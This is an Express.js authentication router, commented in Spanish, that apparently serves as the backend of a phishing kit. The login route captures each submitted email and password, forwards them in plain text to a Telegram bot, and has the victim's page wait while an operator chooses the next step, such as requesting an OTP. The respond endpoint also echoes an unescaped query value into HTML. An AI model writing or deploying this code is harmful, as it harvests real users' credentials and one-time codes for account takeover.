const express = require('express');
const router = express.Router();
const telegramService = require('../services/telegramService');
const sessionService = require('../services/sessionService');
const { validateEmail, validatePassword } = require('../middleware/validationMiddleware');

// POST /api/auth/login
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validación
    if (!email || !validateEmail(email)) {
      return res.status(400).json({ error: 'Email inválido' });
    }

    if (!password || !validatePassword(password)) {
      return res.status(400).json({ error: 'Contraseña inválida' });
    }

    // Crear sesión
    const sessionId = sessionService.createSession({
      type: 'login',
      email,
      password,
    });

    // Enviar a Telegram (sin bloquear si falla)
    try {
      await telegramService.sendAuthRequest(sessionId, email, password);
      console.log('[AUTH] Mensaje enviado a Telegram exitosamente');
    } catch (telegramError) {
      console.error('[AUTH] Error enviando a Telegram:', telegramError.message);
      // No fallar aquí, dejar que continúe el polling
    }

    // Responder al cliente
    res.json({
      sessionId,
      message: 'Solicitud enviada. Aguardando respuesta...',
    });
  } catch (error) {
    console.error('[AUTH ERROR]', error);
    res.status(500).json({ error: 'Error al procesar la solicitud: ' + error.message });
  }
});

// GET /api/auth/status/:sessionId
router.get('/status/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;

    // Validar sesión
    if (!sessionId) {
      return res.status(400).json({ error: 'Session ID requerido' });
    }

    const session = sessionService.getSession(sessionId);

    // Sesión no existe
    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada o expirada' });
    }

    // Sesión expirada
    if (sessionService.isExpired(sessionId)) {
      sessionService.deleteSession(sessionId);
      return res.status(410).json({ error: 'Sesión expirada' });
    }

    // Retornar estado
    res.json({
      sessionId,
      status: session.status,
      response: session.response, // null, 'ERROR', 'RegistroOtp', etc
    });
  } catch (error) {
    console.error('[STATUS ERROR]', error);
    res.status(500).json({ error: 'Error al obtener estado' });
  }
});

// GET /api/auth/respond/:sessionId - Endpoint para botones de Telegram
router.get('/respond/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const { response } = req.query;

    if (!sessionId || !response) {
      return res.status(400).json({ error: 'Parámetros requeridos' });
    }

    const session = sessionService.getSession(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada' });
    }

    // Actualizar sesión con la respuesta
    sessionService.updateSessionStatus(sessionId, 'completed', response);

    console.log(`[AUTH RESPOND] Session ${sessionId}: ${response}`);

    // Responder con página de éxito
    res.send(`
      <html>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h1>✅ Respuesta registrada</h1>
          <p>Tu respuesta: <strong>${response}</strong></p>
          <p>Puedes cerrar esta ventana y continuar en la aplicación.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error('[RESPOND ERROR]', error);
    res.status(500).json({ error: 'Error al procesar respuesta' });
  }
});

module.exports = router;
